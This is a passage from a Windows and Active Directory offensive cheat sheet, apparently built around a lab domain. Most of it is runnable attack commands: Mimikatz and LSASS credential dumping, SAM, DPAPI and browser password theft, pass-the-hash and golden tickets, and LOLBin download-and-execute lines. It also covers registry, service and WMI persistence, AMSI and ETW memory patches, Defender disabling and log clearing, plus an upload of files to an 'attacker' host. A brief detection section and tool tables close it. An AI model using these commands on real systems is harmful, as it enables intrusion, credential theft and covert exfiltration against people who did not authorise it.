Invoke-Nightmare -DLL "C:\path\to\adduser.dll"
```

## 10. HiveNightmare / SeriousSAM (CVE-2021-36934)

```powershell
# Check if vulnerable (can read SAM)
icacls C:\Windows\System32\config\SAM

# If BUILTIN\Users has (I)(RX), vulnerable

# Exploit - copy shadow copies of SAM/SYSTEM/SECURITY
# First, check for shadow copies
vssadmin list shadows

# Copy from shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\temp\SECURITY

# Extract hashes
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

---

# Credential Access

## 1. LSASS Dump

### Mimikatz
```powershell
# Run as admin
mimikatz.exe

# Enable debug privilege
privilege::debug

# Dump credentials
sekurlsa::logonpasswords

# Dump specific
sekurlsa::msv           # NTLM hashes
sekurlsa::wdigest       # WDigest (plaintext if enabled)
sekurlsa::kerberos      # Kerberos tickets
sekurlsa::tspkg         # TsPkg
sekurlsa::livessp       # LiveSSP
sekurlsa::ssp           # SSP
sekurlsa::credman       # Credential Manager
```

### Procdump (Sysinternals)
```powershell
# Dump LSASS to file
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Analyze offline with Mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### Comsvcs.dll (LOLBin)
```powershell
# Find LSASS PID
tasklist | findstr lsass
# Or: Get-Process lsass

# Dump using rundll32
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
```

### Task Manager
```
1. Open Task Manager as Administrator
2. Details tab
3. Right-click lsass.exe
4. Create dump file
```

### PPLdump (bypass PPL)
```powershell
# If LSA Protection (PPL) is enabled
PPLdump.exe lsass.exe lsass.dmp
```

## 2. SAM Database

```powershell
# Mimikatz - dump SAM
lsadump::sam

# Mimikatz - from backup
lsadump::sam /system:C:\Windows\Temp\SYSTEM /sam:C:\Windows\Temp\SAM

# reg save
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY

# secretsdump locally
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# CrackMapExec
crackmapexec smb 192.168.56.11 -u itachi -p 'Akatsuki123!' --sam
```

## 3. LSA Secrets

```powershell
# Mimikatz
lsadump::secrets

# Impacket
secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.11

# Contains:
# - Service account passwords
# - Scheduled task passwords
# - Auto-logon passwords
# - VPN passwords
```

## 4. Cached Domain Credentials (DCC2)

```powershell
# Mimikatz - dump cached creds
lsadump::cache

# Impacket - from backup
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

# Crack DCC2 hashes
hashcat -m 2100 dcc2_hashes.txt wordlist.txt
john --format=mscach2 dcc2_hashes.txt
```

## 5. DPAPI Secrets

```powershell
# List vaults
vaultcmd /list

# Mimikatz - DPAPI
dpapi::cred /in:C:\Users\itachi\AppData\Local\Microsoft\Credentials\<GUID>
dpapi::masterkey /in:C:\Users\itachi\AppData\Roaming\Microsoft\Protect\<SID>\<GUID> /rpc

# Chrome passwords
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"

# Decrypt with SharpDPAPI
SharpDPAPI.exe credentials
SharpDPAPI.exe rdg /unprotect
SharpDPAPI.exe vaults
```

## 6. Windows Credential Manager

```powershell
# List credentials
cmdkey /list

# Mimikatz
vault::cred /patch

# PowerShell
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword(); $_ }
```

## 7. Browser Credentials

```powershell
# Chrome - SharpChrome
SharpChrome.exe logins
SharpChrome.exe cookies

# Firefox - firepwd
python firepwd.py -d /path/to/firefox/profile

# LaZagne - all browsers
lazagne.exe browsers

# Mimikatz - Chrome
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

## 8. WiFi Credentials

```powershell
# List profiles
netsh wlan show profiles

# Get password
netsh wlan show profile name="SSID" key=clear

# Export all
netsh wlan export profile key=clear folder=C:\temp\

# Mimikatz
mimikatz # misc::wifi
```

## 9. GPP Passwords (Group Policy Preferences)

```bash
# From Kali
gpp-decrypt "ENCRYPTED_PASSWORD"

# Get-GPPPassword PowerShell
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword

# Manual search
findstr /S /I cpassword \\DC\SYSVOL\*.xml

# Location
\\DC\SYSVOL\domain\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
```

---

# Token Manipulation

## 1. Token Impersonation

```powershell
# Mimikatz - list tokens
token::list

# Impersonate token
token::elevate                           # Elevate to SYSTEM
token::elevate /domainadmin              # Find and impersonate DA
token::elevate /user:AKATSUKI\itachi     # Specific user

# Revert
token::revert
```

## 2. Incognito (Meterpreter/Standalone)

```powershell
# In Meterpreter
load incognito
list_tokens -u
impersonate_token "AKATSUKI\\itachi"

# Standalone
incognito.exe list_tokens -u
incognito.exe execute -c "AKATSUKI\itachi" cmd.exe
```

## 3. RunAs

```cmd
# RunAs with password
runas /user:AKATSUKI\itachi cmd.exe

# RunAs with saved credentials
runas /savecred /user:AKATSUKI\itachi cmd.exe

# RunAs with netonly (network auth only)
runas /netonly /user:AKATSUKI\itachi cmd.exe
```

## 4. Pass-the-Hash

```bash
# Impacket - various tools
psexec.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.11
wmiexec.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.11
smbexec.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.11

# CrackMapExec
crackmapexec smb 192.168.56.11 -u itachi -H NTHASH

# Mimikatz
sekurlsa::pth /user:itachi /domain:AKATSUKI /ntlm:NTHASH /run:cmd.exe
```

## 5. Pass-the-Ticket

```powershell
# Export tickets
mimikatz # sekurlsa::tickets /export

# Import ticket
mimikatz # kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:BASE64_TICKET
Rubeus.exe ptt /ticket:ticket.kirbi
```

## 6. Over-Pass-the-Hash (Pass-the-Key)

```powershell
# Mimikatz - request TGT using NTLM hash
sekurlsa::pth /user:itachi /domain:AKATSUKI /ntlm:NTHASH /run:cmd.exe

# The new cmd.exe will request TGT for itachi

# Rubeus - request TGT
Rubeus.exe asktgt /user:itachi /rc4:NTHASH /ptt
Rubeus.exe asktgt /user:itachi /aes256:AESKEY /ptt
```

---

# Living Off the Land (LOLBins)

## Execution

```powershell
# MSBuild
msbuild.exe evil.csproj

# MSHTA
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd"", 0:close")
mshta.exe http://192.168.56.100/evil.hta

# Rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("cmd")

# Regsvr32
regsvr32 /s /n /u /i:http://192.168.56.100/evil.sct scrobj.dll

# WMIC
wmic process call create "cmd.exe /c whoami"
wmic os get /format:"http://192.168.56.100/evil.xsl"

# Certutil
certutil -urlcache -split -f http://192.168.56.100/payload.exe C:\Windows\Temp\payload.exe
certutil -encode payload.exe payload.b64
certutil -decode payload.b64 payload.exe

# Bitsadmin
bitsadmin /transfer job /download /priority high http://192.168.56.100/payload.exe C:\Windows\Temp\payload.exe

# InstallUtil
InstallUtil.exe /logfile= /LogToConsole=false /U evil.dll

# Regasm/Regsvcs
regasm.exe /U evil.dll
regsvcs.exe evil.dll

# CMSTP
cmstp.exe /s /ns evil.inf

# Forfiles
forfiles /p c:\windows\system32 /m notepad.exe /c "cmd.exe /c calc.exe"

# PCALUA
pcalua.exe -a calc.exe

# SyncAppvPublishingServer
SyncAppvPublishingServer.exe "n; Start-Process cmd"
```

## Download

```powershell
# Certutil
certutil -urlcache -split -f http://192.168.56.100/file.exe file.exe

# Bitsadmin
bitsadmin /transfer job http://192.168.56.100/file.exe C:\file.exe

# PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://192.168.56.100/file.exe','C:\file.exe')"
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.100/script.ps1')"

# curl (Win10+)
curl http://192.168.56.100/file.exe -o file.exe

# Expand
expand http://192.168.56.100/file.zip C:\file.exe

# Desktopimgdownldr
desktopimgdownldr.exe /lockscreenurl:http://192.168.56.100/file.exe /o:C:\file.exe
```

## Compile/Execute

```powershell
# CSC
csc.exe /out:evil.exe evil.cs

# Jsc
jsc.exe evil.js

# Vbc
vbc.exe /out:evil.exe evil.vb
```

---

# Persistence Techniques

## 1. Registry Run Keys

```powershell
# Current User
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Evil /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

# Local Machine (requires admin)
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Evil /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

# RunOnce
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v Evil /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
```

## 2. Scheduled Tasks

```powershell
# Create task
schtasks /create /tn "Evil" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM

# Daily at specific time
schtasks /create /tn "Evil" /tr "C:\Windows\Temp\payload.exe" /sc daily /st 09:00 /ru SYSTEM

# On idle
schtasks /create /tn "Evil" /tr "C:\Windows\Temp\payload.exe" /sc onidle /i 5
```

## 3. Services

```powershell
# Create service
sc create EvilSvc binPath= "C:\Windows\Temp\payload.exe" start= auto obj= LocalSystem

# Using PowerShell
New-Service -Name "EvilSvc" -BinaryPathName "C:\Windows\Temp\payload.exe" -StartupType Automatic
```

## 4. WMI Event Subscription

```powershell
# Create filter
$filterName = "EvilFilter"
$filterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$filterNS = "root\cimv2"
$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{Name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$filterQuery}

# Create consumer
$consumerName = "EvilConsumer"
$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{Name=$consumerName; CommandLineTemplate="C:\Windows\Temp\payload.exe"}

# Bind filter to consumer
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}
```

## 5. Startup Folder

```powershell
# Current user
copy C:\Windows\Temp\payload.exe "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

# All users
copy C:\Windows\Temp\payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

## 6. DLL Hijacking Persistence

```powershell
# Find vulnerable applications
# Place malicious DLL in same directory as executable
# Or in a PATH directory before legitimate DLL
```

## 7. COM Hijacking

```powershell
# HKCU COM hijacking (user level)
reg add "HKCU\SOFTWARE\Classes\CLSID\{GUID}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\Temp\evil.dll" /f

# Common hijackable CLSIDs
# {0A29FF9E-7F9C-4437-8B11-F424491E3931}  # Chrome update
# {42aedc87-2188-41fd-b9a3-0c966feabec1}  # Event Viewer
```

## 8. BITS Jobs

```powershell
bitsadmin /create evil
bitsadmin /addfile evil http://192.168.56.100/payload.exe C:\Windows\Temp\payload.exe
bitsadmin /SetNotifyCmdLine evil C:\Windows\Temp\payload.exe NUL
bitsadmin /SetMinRetryDelay evil 60
bitsadmin /resume evil
```

## 9. AppInit_DLLs

```powershell
# Load DLL into every process that loads user32.dll
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\Windows\Temp\evil.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
```

## 10. Golden Ticket

```powershell
# Mimikatz - Create golden ticket
kerberos::golden /user:Administrator /domain:akatsuki.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain akatsuki.local Administrator
export KRB5CCNAME=Administrator.ccache
```

---

# Defense Evasion

## 1. AMSI Bypass

```powershell
# PowerShell - Basic bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# Memory patch
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32
$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

## 2. Disable Windows Defender

```powershell
# Disable real-time monitoring (requires admin)
Set-MpPreference -DisableRealtimeMonitoring $true

# Add exclusion
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
Add-MpPreference -ExclusionProcess "payload.exe"

# Disable via GPO
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
```

## 3. Disable ETW

```powershell
# Patch ETW
$logEntryFunctionPointer = [Win32]::GetProcAddress([Win32]::LoadLibrary("ntdll.dll"), "EtwEventWrite")
$p = 0
[Win32]::VirtualProtect($logEntryFunctionPointer, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xC3)  # RET
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $logEntryFunctionPointer, 1)
```

## 4. Disable ScriptBlock Logging

```powershell
# Registry method
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
```

## 5. Parent PID Spoofing

```powershell
# Using NtCreateUserProcess or PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
# Makes malware appear as child of legitimate process
```

## 6. Process Hollowing

```powershell
# Start suspended process
# Unmap original code
# Write malicious code
# Resume process
```

## 7. Timestomping

```powershell
# Modify file timestamps
$(Get-Item C:\Windows\Temp\payload.exe).CreationTime = "01/01/2020 12:00:00"
$(Get-Item C:\Windows\Temp\payload.exe).LastAccessTime = "01/01/2020 12:00:00"
$(Get-Item C:\Windows\Temp\payload.exe).LastWriteTime = "01/01/2020 12:00:00"
```

## 8. Clear Event Logs

```powershell
# Clear all logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# PowerShell
Clear-EventLog -LogName Security, System, Application

# Clear specific entries (more stealthy)
# Requires special tools
```

---

# Useful Tools & Projects

## Reconnaissance & Enumeration

| Tool | Description | URL |
|------|-------------|-----|
| BloodHound | AD attack path mapping | https://github.com/BloodHoundAD/BloodHound |
| SharpHound | BloodHound collector | https://github.com/BloodHoundAD/SharpHound |
| PowerView | AD enumeration | https://github.com/PowerShellMafia/PowerSploit |
| ADRecon | AD audit tool | https://github.com/adrecon/ADRecon |
| PingCastle | AD security assessment | https://pingcastle.com |

## Credential Access

| Tool | Description | URL |
|------|-------------|-----|
| Mimikatz | Credential extraction | https://github.com/gentilkiwi/mimikatz |
| Rubeus | Kerberos abuse | https://github.com/GhostPack/Rubeus |
| Impacket | Network protocols | https://github.com/fortra/impacket |
| LaZagne | Password recovery | https://github.com/AlessandroZ/LaZagne |
| SharpDPAPI | DPAPI abuse | https://github.com/GhostPack/SharpDPAPI |
| Pypykatz | Mimikatz in Python | https://github.com/skelsec/pypykatz |

## Lateral Movement

| Tool | Description | URL |
|------|-------------|-----|
| CrackMapExec | Swiss army knife | https://github.com/Porchetta-Industries/CrackMapExec |
| Evil-WinRM | WinRM shell | https://github.com/Hackplayers/evil-winrm |
| PsExec | Remote execution | https://docs.microsoft.com/sysinternals |
| SharpRDP | RDP command execution | https://github.com/0xthirteen/SharpRDP |
| Invoke-TheHash | Pass-the-Hash | https://github.com/Kevin-Robertson/Invoke-TheHash |

## Privilege Escalation

| Tool | Description | URL |
|------|-------------|-----|
| PowerUp | Windows privesc | https://github.com/PowerShellMafia/PowerSploit |
| WinPEAS | Windows enum | https://github.com/carlospolop/PEASS-ng |
| Seatbelt | Security checks | https://github.com/GhostPack/Seatbelt |
| SharpUp | C# PowerUp | https://github.com/GhostPack/SharpUp |
| UACME | UAC bypasses | https://github.com/hfiref0x/UACME |
| Potato Family | Token impersonation | Various |

## Persistence

| Tool | Description | URL |
|------|-------------|-----|
| SharPersist | Persistence toolkit | https://github.com/mandiant/SharPersist |
| Covenant | C2 framework | https://github.com/cobbr/Covenant |
| Sliver | C2 framework | https://github.com/BishopFox/sliver |

## Defense Evasion

| Tool | Description | URL |
|------|-------------|-----|
| Invoke-Obfuscation | PS obfuscation | https://github.com/danielbohannon/Invoke-Obfuscation |
| Chameleon | PS obfuscation | https://github.com/klezVirus/chameleon |
| NimCrypt2 | AV bypass | https://github.com/icyguider/Nimcrypt2 |
| ScareCrow | EDR bypass | https://github.com/optiv/ScareCrow |

## All-in-One

| Tool | Description | URL |
|------|-------------|-----|
| PowerSploit | PS post-exploitation | https://github.com/PowerShellMafia/PowerSploit |
| Empire | Post-exploitation | https://github.com/BC-SECURITY/Empire |
| Metasploit | Exploitation framework | https://github.com/rapid7/metasploit-framework |
| Cobalt Strike | Commercial C2 | https://cobaltstrike.com |

---

# Blue Team Detection

## Key Event IDs

| Event ID | Source | Description |
|----------|--------|-------------|
| 4624 | Security | Successful logon |
| 4625 | Security | Failed logon |
| 4648 | Security | Explicit credential logon |
| 4672 | Security | Special privileges assigned |
| 4688 | Security | Process creation |
| 4697 | Security | Service installed |
| 4698-4702 | Security | Scheduled task events |
| 4720-4726 | Security | User account events |
| 4728-4735 | Security | Group membership events |
| 4768 | Security | Kerberos TGT request |
| 4769 | Security | Kerberos service ticket |
| 4771 | Security | Kerberos pre-auth failed |
| 4776 | Security | Credential validation |
| 5136 | Security | AD object modified |
| 5145 | Security | Share access |
| 7045 | System | Service installed |

## Sysmon Events

| Event ID | Description |
|----------|-------------|
| 1 | Process creation |
| 3 | Network connection |
| 7 | Image loaded |
| 8 | CreateRemoteThread |
| 10 | Process access |
| 11 | File create |
| 12-14 | Registry events |
| 22 | DNS query |
| 25 | Process tampering |

## Detection Queries

```yaml
# Detect PsExec
rule:
  - Process name: PSEXESVC.exe
  - Service installation with PSEXEC pattern
  - Named pipe: \PSEXESVC

# Detect WMI lateral movement
rule:
  - Parent: wmiprvse.exe
  - Child: cmd.exe, powershell.exe

# Detect encoded PowerShell
rule:
  - CommandLine contains: -enc, -e, -encodedcommand

# Detect credential dumping
rule:
  - Process access to lsass.exe
  - Process: mimikatz, procdump targeting lsass

# Detect UAC bypass
rule:
  - Registry modification: HKCU\Software\Classes\ms-settings
  - Parent: fodhelper.exe, eventvwr.exe with unexpected child
```

---

# Quick Reference Commands

## Remote Execution
```bash
# PsExec
psexec.py DOMAIN/user:pass@target

# WMI
wmiexec.py DOMAIN/user:pass@target

# WinRM
evil-winrm -i target -u user -p pass

# DCOM
dcomexec.py DOMAIN/user:pass@target

# SMB
smbexec.py DOMAIN/user:pass@target
```

## Credential Extraction
```powershell
# LSASS
sekurlsa::logonpasswords

# SAM
lsadump::sam

# DCSync
lsadump::dcsync /domain:domain /user:krbtgt
```

## Pass-the-Hash
```bash
psexec.py -hashes :NTHASH DOMAIN/user@target
crackmapexec smb target -u user -H HASH
```

## File Transfer
```powershell
# Download
certutil -urlcache -split -f http://attacker/file C:\file
iwr http://attacker/file -OutFile C:\file

# Upload
Invoke-WebRequest -Uri http://attacker/upload -Method POST -InFile C:\file
```

---

# References

- [MITRE ATT&CK](https://attack.mitre.org/)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Red Team Notes](https://www.ired.team/)
- [The Hacker Recipes](https://www.thehacker.recipes/)
